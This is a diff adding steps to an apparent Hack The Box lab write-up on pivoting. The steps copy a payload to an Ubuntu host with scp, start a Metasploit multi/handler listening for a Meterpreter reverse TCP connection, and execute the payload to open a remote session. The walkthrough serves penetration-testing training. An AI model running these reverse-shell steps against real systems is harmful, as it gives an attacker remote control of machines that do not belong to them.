@@ -156,5 +156,48 @@ Saved as: shell
 
 ```
 
+I ran the following command to copy the payload to the Ubuntu server using scp:
+```bash
+scp /home/htb-ac-1310789/shell ubuntu@10.129.135.184:/home/ubuntu
+
+ubuntu@10.129.135.184's password: 
+shell                                                                                                                                                      100%  250    26.6KB/s   00:00
+```
+
+I then set up and started the multi/handler in Metasploit to listen for the reverse connection:
+```bash
+msfconsole -q
+[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 0.0.0.0
+lhost => 0.0.0.0
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 8080
+lport => 8080
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload linux/x64/meterpreter/reverse_tcp
+payload => linux/x64/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
+
+[*] Started reverse TCP handler on 0.0.0.0:8080 
+```
+
+After that I executed the payload on the pivot host with following commands:
+
+```bash 
+ubuntu@WEB01:~$ ls
+shell
+ubuntu@WEB01:~$ chmod +x shell
+ubuntu@WEB01:~$ ./shell
+```
+This successfully initiated the reverse TCP connection, and we received a Meterpreter session:
+```bash
+[*] Started reverse TCP handler on 0.0.0.0:8080 
+[*] Sending stage (3045380 bytes) to 10.129.135.184
+[*] Meterpreter session 1 opened (10.10.14.162:8080 -> 10.129.135.184:47350) at 2025-03-03 11:12:38 -0600
+```
+
+
+
+
+
 
 
